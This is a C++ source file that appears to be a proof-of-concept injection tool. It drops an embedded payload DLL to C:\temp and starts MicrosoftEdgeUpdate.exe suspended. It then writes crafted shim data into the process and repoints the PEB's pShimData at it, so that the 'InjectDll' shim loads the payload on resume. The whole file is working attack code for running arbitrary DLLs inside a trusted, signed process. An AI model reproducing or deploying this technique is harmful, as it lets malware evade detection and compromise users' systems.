#include "ShimInjector.h"

wstring g_ResourceDirectory = L"C:\\temp";
wstring g_ResourceFileName = L"RTVideo.dll";

void BuildShimData(PSHIM_DATA ShimDataBuffer, BOOL IsWow64)
{
	ZeroMemory(ShimDataBuffer, sizeof(SHIM_DATA));
	ShimDataBuffer->Size = sizeof(SHIM_DATA);
	ShimDataBuffer->Magic = SHIMDATA_MAGIC;
	ShimDataBuffer->UpBit = 1;
	if (IsWow64)
	{
		ShimDataBuffer->ExeType = SHIMDATA_PLATFORM_X86;
		ShimDataBuffer->ExeTag = 0x4ed54; // InjectDll RTVideo.dll
	}
	else
	{
		ShimDataBuffer->ExeType = SHIMDATA_PLATFORM_X64;
		ShimDataBuffer->ExeTag = 0x40be2; // CorrectFilePaths %WinDir%\xobglu16.dll -> %UserProfile%\xobglu16.dll
	}
	ShimDataBuffer->ExeCount = 1;
	wcout << L"ShimDataBuffer built\nSize: 0x" << std::hex << ShimDataBuffer->Size << "\nMagic: 0x" << ShimDataBuffer->Magic << "\nUpBit: " << ShimDataBuffer->UpBit
		<< "\nExeType: 0x" << ShimDataBuffer->ExeType << "\nExeTag: 0x" << ShimDataBuffer->ExeTag << endl;
}

void InitProcessDataManual(HANDLE ProcessHandle, PSHIM_DATA ShimData, BOOL IsWow64)
{
	PVOID remoteBuffer = VirtualAllocEx(ProcessHandle, nullptr, sizeof(SHIM_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (nullptr == remoteBuffer)
		ThrowException("[InitProcessDataManual] VirtualAllocEx failed", GetLastError());


	BOOL success = WriteProcessMemory(ProcessHandle, remoteBuffer, ShimData, sizeof(SHIM_DATA), nullptr);
	if (!success)
	{
		VirtualFreeEx(ProcessHandle, remoteBuffer, sizeof(SHIM_DATA), MEM_RELEASE);
		ThrowException("[InitProcessDataManual] writing ShimData to remote process failed", GetLastError());
	}

	PROCESS_BASIC_INFORMATION pbi = {};
	NTSTATUS status = NtQueryInformationProcess(ProcessHandle, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);
	if (!NT_SUCCESS(status))
	{
		VirtualFreeEx(ProcessHandle, remoteBuffer, sizeof(SHIM_DATA), MEM_RELEASE);
		ThrowException("[InitProcessDataManual] NtQueryInformationProcess failed", status);
	}
	wcout << "Allocated Memory at: 0x" << std::hex << reinterpret_cast<ULONG_PTR>(remoteBuffer) << endl;
	

	PVOID pShimDataAddress = nullptr;
	ULONG_PTR pebAddress = 0;
#ifdef _WIN64
	if (IsWow64)
	{
		pebAddress = pbi.PebBaseAddress + 0x1000;
		const PEB32* peb = reinterpret_cast<PEB32*>(pebAddress);
		pShimDataAddress = (PVOID)&peb->pShimData;
	}
	else
	{
		pebAddress = pbi.PebBaseAddress;
		const PEB64* peb = reinterpret_cast<PEB64*>(pebAddress);
		pShimDataAddress = (PVOID)&peb->pShimData;
	}
#else
	pebAddress = pbi.PebBaseAddress;
	const PEB32* peb = reinterpret_cast<PEB32*>(pebAddress);
	pShimDataAddress = (PVOID)&peb->pShimData;
#endif
	wcout << L"PEB: 0x" << std::hex << pebAddress << std::dec << endl;
	wcout << L"pShimData offset: 0x" << std::hex << reinterpret_cast<ULONG_PTR>(pShimDataAddress) - pebAddress << std::dec << endl;
	success = WriteProcessMemory(ProcessHandle, pShimDataAddress, &remoteBuffer, sizeof(PVOID), nullptr);
	if (!success)
	{
		VirtualFreeEx(ProcessHandle, remoteBuffer, sizeof(SHIM_DATA), MEM_RELEASE);
		ThrowException("[InitProcessDataManual] overwriting PEB->pShimData of remote process failed", GetLastError());
	}
	wcout << L"Written pointer for allocated memory to pShimData: 0x" << std::hex << reinterpret_cast<ULONG_PTR>(pShimDataAddress) << std::dec << endl;
}

void InjectShimData(wstring& Path, wstring& Commandline)
{
	BOOL success = FALSE;

	// disable wow64 redirection to create the exact process requested
#ifndef _WIN64
	PVOID oldValue;
	success = Wow64DisableWow64FsRedirection(&oldValue);
	if (!success)
		ThrowException("[InjectShimData] Wow64DisableWow64FsRedirection failed", GetLastError());
#endif

	// Create process with NtCreateUserProcessWrap to avoid CreateProcessW editing the shim of the child process
	HANDLE processHandle, threadHandle;
	NtCreateUserProcessWrap(Path, Commandline, g_ResourceDirectory , &processHandle, &threadHandle, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED);
	wcout << Path << L" created" << endl << "PID: " << GetProcessId(processHandle) << endl;

	// Check if the child process is 32bit to read the PEB accordingly
	BOOL isWow64 = FALSE;
	success = IsWow64Process(processHandle, &isWow64);
	if (!success)
		ThrowException("[InjectShimData] IsWow64Process failed", GetLastError());

	// 32bit process cannot hold memory addresses of 64bit processes
#ifndef _WIN64
	if (!isWow64)
	{
		TerminateProcess(processHandle, EXIT_SUCCESS);
		ThrowException("[InjectShimData] 32bit process cannot get the PEB address of a 64bit process", STATUS_INVALID_IMAGE_WIN_64);
	}
#endif

	PSHIM_DATA shimDataBuffer = new SHIM_DATA;
	BuildShimData(shimDataBuffer, isWow64);
	InitProcessDataManual(processHandle, shimDataBuffer, isWow64);
	delete shimDataBuffer;
	ResumeThread(threadHandle);
	wcout << "ResumeThread" << endl;
	WaitForSingleObject(threadHandle, 2000);
	TerminateProcess(processHandle, EXIT_SUCCESS);
}

void CreateRedirectedFile()
{
	WCHAR userProfile[MAX_PATH] = {};
	GetEnvironmentVariableW(L"UserProfile", userProfile, MAX_PATH);
	wstring path = userProfile;
	path.append(L"\\xobglu16.dll");
	HANDLE fileHandle = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (nullptr == fileHandle)
		ThrowException("[CreateRedirectedFile] CreateFileW failed", GetLastError());

	wstring fileData = L"testtest\n";
	if (!WriteFile(fileHandle, fileData.c_str(), fileData.size() * sizeof(WCHAR), nullptr, nullptr))
		ThrowException("[CreateRedirectedFile] WriteFile failed", GetLastError());

	CloseHandle(fileHandle);
}

int main()
{
	try
	{
		bool test32bit = true;
		wstring path, commandline;
		if (test32bit)
		{
			path = L"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe";
			DropResource(g_ResourceDirectory, g_ResourceFileName, MAKEINTRESOURCEA(IDR_RCDATA1), MAKEINTRESOURCEA(RT_RCDATA));
			wcout << L"Payload written to " << g_ResourceDirectory << L"\\" << g_ResourceFileName << endl;
		}
		else
		{
			path = L"C:\\temp\\cmd.exe";
			CopyFileW(L"C:\\Windows\\system32\\cmd.exe", path.c_str(), FALSE);
			CreateRedirectedFile();
			commandline = L"/c type %windir%\\xobglu16.dll > C:\\temp\\cmd.txt";
		}
		InjectShimData(path, commandline);
	}
	catch (std::exception& ex)
	{
		wcout << ex.what() << endl;
	}
	
	wcout << L"Done" << endl;
	return EXIT_SUCCESS;
}